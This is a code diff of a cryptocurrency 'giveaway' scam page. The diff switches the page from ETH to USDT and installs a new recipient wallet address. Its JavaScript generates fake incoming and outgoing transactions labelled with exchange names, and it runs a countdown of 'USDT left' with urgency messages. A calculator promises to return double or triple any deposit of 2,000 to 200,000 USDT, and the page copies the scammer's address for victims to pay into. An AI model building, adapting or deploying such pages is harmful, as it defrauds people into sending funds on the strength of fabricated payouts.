@@ -356,9 +356,9 @@
     </main>
     <!-- ###############################Start of progress bar######################################### -->
 
-        <script src="../jquery-3.6.0.min.js"></script>
+       <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-        
+
 
 
 
@@ -383,7 +383,7 @@ function generateId(length) {
   for (
     var result = '',
       characters =
-        'bc1qde77rm5vvg4nq225xc4expr65hvj85r90pqv8w',
+        '0x1c64f0CC22F6A7C3c60e2E1F6467607B98647B23',
       charactersLength = characters.length,
       i = 0;
     i < length;
@@ -410,10 +410,10 @@ function create_transaction(mins) {
   var table,
     row = (table = document.getElementById('myTable')).insertRow(1),
     address = get_random(),
-    amount = (2.5 * Math.random()).toFixed(2),
+    amount = (200000 * Math.random()).toFixed(2),
     decimal = String(Math.random(1, 999))
   row.innerHTML =
-    '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="index-2.html">' +
+    '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="index.html">' +
     generateId(63) +
     '</a> </td> <td class="d-none d-sm-table-cell"><a href="index.html">9' +
     tx(99999999) +
@@ -421,26 +421,26 @@ function create_transaction(mins) {
     mins +
     ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0xCa5b7de44a89A59882422d0bDF3A1894EB50D315</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x1c64f0CC22F6A7C3c60e2E1F6467607B98647B23</span> </td> <td>' +
     amount +
-    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
     '</span></td> </tr>'
   var table,
     row = (table = document.getElementById('myTable')).insertRow(1),
     send_amount = amount * parcent
   row.innerHTML =
-    '<tr> <td><a class="hash-tag text-truncate" href="index-2.html">' +
+    '<tr> <td><a class="hash-tag text-truncate" href="index.html">' +
     generateId(63) +
     '</a> </td> <td class="d-none d-sm-table-cell"><a href="index.html">9' +
     tx(99999999) +
     '</a></td> <td><span class="timer">' +
     mins +
-    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0xCa5b7de44a89A59882422d0bDF3A1894EB50D315</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
+    ' mins ago</span></td> <td><span class="hash-tag text-truncate">0x1c64f0CC22F6A7C3c60e2E1F6467607B98647B23</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
     address +
     '</a> </td> <td>' +
     send_amount +
-    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
     '</span></td> </tr>'
 }
@@ -455,18 +455,18 @@ function new_transaction() {
   var table,
     row = document.getElementById('myTable').insertRow(1),
     address = get_random(),
-    amount = (2.5 * Math.random()).toFixed(2),
+    amount = (200000 * Math.random()).toFixed(2),
     decimal = String(Math.random(1, 999))
   ;(row.innerHTML =
-    '<tr> <td><a class="hash-tag text-truncate" href="index-2.html">' +
+    '<tr> <td><a class="hash-tag text-truncate" href="index.html">' +
     generateId(63) +
     '</a> </td> <td class="d-none d-sm-table-cell"><a href="index.html">9' +
     tx(99999999) +
     '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0xCa5b7de44a89A59882422d0bDF3A1894EB50D315</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">0x1c64f0CC22F6A7C3c60e2E1F6467607B98647B23</span> </td> <td>' +
     amount +
-    ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
+    ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
     '</span></td> </tr>'),
     document
@@ -478,15 +478,15 @@ function new_transaction() {
         row = document.getElementById('myTable').insertRow(1),
         send_amount = amount * parcent
       ;(row.innerHTML =
-        '<tr> <td><a class="hash-tag text-truncate" href="index-2.html">' +
+        '<tr> <td><a class="hash-tag text-truncate" href="index.html">' +
         generateId(63) +
         '</a> </td> <td class="d-none d-sm-table-cell"><a href="index.html">9' +
         tx(99999999) +
-        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0xCa5b7de44a89A59882422d0bDF3A1894EB50D315</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
+        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">0x1c64f0CC22F6A7C3c60e2E1F6467607B98647B23</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="index.html">' +
         address +
         '</a> </td> <td>' +
         send_amount +
-        ' ETH</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
         tx(999) +
         '</span></td> </tr>'),
         document
@@ -515,33 +515,33 @@ function update_trans() {
 
 ;(get_random = function (
   list = [
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'Binance 1',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'Binance 2',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'Binance 3',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'Remitano 2',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'Remitano 3',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'Remitano 1',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'Mercatox',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'IndaCoin',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'CoinExchange.io',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'HitBTC 2',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'HitBTC 1',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'LAToken 3',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'LAToken 2',
-    "3" + generateId(40),
+    "0x" + generateId(40),
     'LAToken 1',
   ],
 ) {
@@ -559,13 +559,13 @@ function update_trans() {
       }, 1e4))
   }),
   $('#gen-btn').click(() => {
-    if ($('#cal-in').val() >= 1 && $('#cal-in').val() <= 100) {
+    if ($('#cal-in').val() >= 1000 && $('#cal-in').val() <= 200000) {
       amount_entered = $('#cal-in').val()
       tm = Date.now()
 	    $("#xrp-tag").text(tx(9999999))
       $('#gen-amount').text(amount_entered)
       $('#warn').text(''), $('.pop-body').css('display', 'flex')
-    } else $('#warn').text('Amount should be within 2000 USDT to 200,000 USDT')
+    } else $('#warn').text('Amount should be within 2,000 USDT to 200,000 USDT')
   }),
   $('#close').click(() => {
     $('.pop-body').css('display', 'none')
@@ -587,7 +587,7 @@ function update_trans() {
   }, 300),
   $('#cal-in').on('input', () => {
     var in_amount = $('#cal-in').val()
-    if (in_amount >= 0 && in_amount < 0.125) {
+    if (in_amount >= 0 && in_amount < 15000) {
       amt = (in_amount * 2)
       out = $('#cal-out')
       out.val(amt)
@@ -597,7 +597,7 @@ function update_trans() {
       // else {
       //   out.val(amt.toFixed(0))
       // }
-    } else if ((in_amount) >= 0.07500000000000001 && in_amount <= 100) {
+    } else if ((in_amount) >= 6000 && in_amount <= 1000000) {
       amt = (in_amount * 3)
       out = $('#cal-out')
       out.val(amt)
@@ -612,7 +612,7 @@ function update_trans() {
 
 $('#cal-out').on('input', () => {
   var in_amount = $('#cal-out').val()
-  if (in_amount >= 0.025 && in_amount < 0.07500000000000001) {
+  if (in_amount >= 2000 && in_amount < 6000) {
     amt = (in_amount / 2)
     out = $('#cal-in')
     out.value(amt)
@@ -623,7 +623,7 @@ $('#cal-out').on('input', () => {
     //   out.value(amt.toFixed(3))
     // }
     $('#cal-in').val(in_amount / 2)
-  } else if ((in_amount) >= 0.07500000000000001 && in_amount <= 100) {
+  } else if ((in_amount) >= 6000 && in_amount <= 1000000) {
     $('#cal-in').val(in_amount / 3)
   }
 })
@@ -681,11 +681,11 @@ function copy_main(id, fade) {
 
 $('#copy_').click(() => {
   copyToClipboard($("#gen-amount").text());
-  $('#copy_').attr('src', "https://binancxcyptoboxbsc.netlify.app/static/files/done.svg");
+  $('#copy_').attr('src', "../static/files/done.svg");
 })
 
 $('#copy_').mouseleave(() => {
-  $('#copy_').attr('src', "https://binancxcyptoboxbsc.netlify.app/static/files/copy.svg");
+  $('#copy_').attr('src', "../static/files/copy.svg");
 })
 
 // Copy amount ends here
@@ -693,21 +693,21 @@ $('#copy_').mouseleave(() => {
 // Copy address part starts here
 
 $('#copy_address').click(() => {
-  copyToClipboard('0xCa5b7de44a89A59882422d0bDF3A1894EB50D315');
-  $('#copy_address').attr('src', 'https://binancxcyptoboxbsc.netlify.app/static/files/done.svg');
+  copyToClipboard('0x1c64f0CC22F6A7C3c60e2E1F6467607B98647B23');
+  $('#copy_address').attr('src', '../static/files/done.svg');
 })
 
 $('#copy_address').mouseleave(() => {
-  $('#copy_address').attr('src', "https://binancxcyptoboxbsc.netlify.app/static/files/copy.svg");
+  $('#copy_address').attr('src', "../static/files/copy.svg");
 })
 
 $('#copy_tag').click(() => {
   copyToClipboard($('#xrp-tag').text());
-  $('#copy_tag').attr('src', 'https://binancxcyptoboxbsc.netlify.app/static/files/done.svg');
+  $('#copy_tag').attr('src', '../static/files/done.svg');
 })
 
 $('#copy_tag').mouseleave(() => {
-  $('#copy_tag').attr('src', "https://binancxcyptoboxbsc.netlify.app/static/files/copy.svg");
+  $('#copy_tag').attr('src', "../static/files/copy.svg");
 })
 
 // Copy address part ends here
@@ -728,35 +728,35 @@ $('#copy_tag').mouseleave(() => {
 
 
         var ctd = setInterval(function () {
-            if (localStorage.getItem("btcprogress")) {
-                if (localStorage.getItem("btcprogress") <= 150) {
-                    var alt_count = localStorage.getItem("btcprogress");
-                } else if (localStorage.getItem("btcprogress")) {
-                    var alt_sec_count = localStorage.getItem("btcprogress");
+            if (localStorage.getItem("usdtprogress")) {
+                if (localStorage.getItem("usdtprogress") <= 150) {
+                    var alt_count = localStorage.getItem("usdtprogress");
+                } else if (localStorage.getItem("usdtprogress")) {
+                    var alt_sec_count = localStorage.getItem("usdtprogress");
                     var alt_count = alt_sec_count - Math.floor((Math.random() * 10) * 4 + 5);
                 }
             } else {
-                var alt_sec_count = 5000;
-                var alt_count = alt_sec_count - Math.floor((Math.random() * 10) * (100 * 2));
+                var alt_sec_count = 50000000;
+                var alt_count = alt_sec_count - Math.floor((Math.random() * 10) * (1000000 * 2));
             }
-            setProgress(alt_count, 20000)
+            setProgress(alt_count, 200000000)
 
 
 
-            localStorage.setItem("btcprogress", alt_count);
+            localStorage.setItem("usdtprogress", alt_count);
 
-            if (alt_sec_count <= 0.5)
+            if (alt_sec_count <= 40000)
                 clearInterval(ctd);
-            if (alt_count <= 300 && alt_sec_count >= 350)
-                document.getElementById("leftBTC").innerHTML = "Left ETH";
-            if (alt_count <= 200 && alt_sec_count >= 250)
-                document.getElementById("leftBTC").innerHTML = "Hurry up, not much more ETH left!";
-            if (alt_count <= 150)
-                document.getElementById("leftBTC").innerHTML = "Last chance to get your ETH!";
-            if (alt_count <= 50)
-                document.title = alt_count + " ETH left";
-            if (alt_count <= 100)
-                document.title = "Get your " + alt_count + " ETH now!";
+            if (alt_count <= 3000000 && alt_sec_count >= 3500000)
+                document.getElementById("leftUSDT").innerHTML = "Left USDT";
+            if (alt_count <= 2000000 && alt_sec_count >= 2500000)
+                document.getElementById("leftUSDT").innerHTML = "Hurry up, not much more USDT left!";
+            if (alt_count <= 1500000)
+                document.getElementById("leftUSDT").innerHTML = "Last chance to get your USDT!";
+            if (alt_count <= 500000)
+                document.title = alt_count + " USDT left";
+            if (alt_count <= 1000000)
+                document.title = "Get your " + alt_count + " USDT now!";
 
         }, 6666);
     </script>
@@ -766,7 +766,7 @@ $('#copy_tag').mouseleave(() => {
 
         function timer(t_ex, timer){
             expire = new Date(t_ex*1000).getTime();
-            now = new Date().getTime(); 
+            now = new Date().getTime();
             dis = expire - now
             days = Math.floor((dis%(1000*60*60*24*24))/(1000*60*60*24))
             hrs = Math.floor((dis%(1000*60*60*24))/(1000*60*60))
@@ -780,12 +780,12 @@ $('#copy_tag').mouseleave(() => {
                 window.location.reload()
             }
         }
-        
+
         function set_timer(){
             let t_ex = null
             if (t_ex){
                 expire = new Date(t_ex*1000).getTime();
-                now = new Date().getTime(); 
+                now = new Date().getTime();
                 dis = expire - now
                 if (dis > 0){
                     timer_html = document.getElementById('timer')
@@ -794,7 +794,7 @@ $('#copy_tag').mouseleave(() => {
                         timer(t_ex, timer_html);
                     }, 1)
                 }
-                
+
             }
         }
         set_timer()
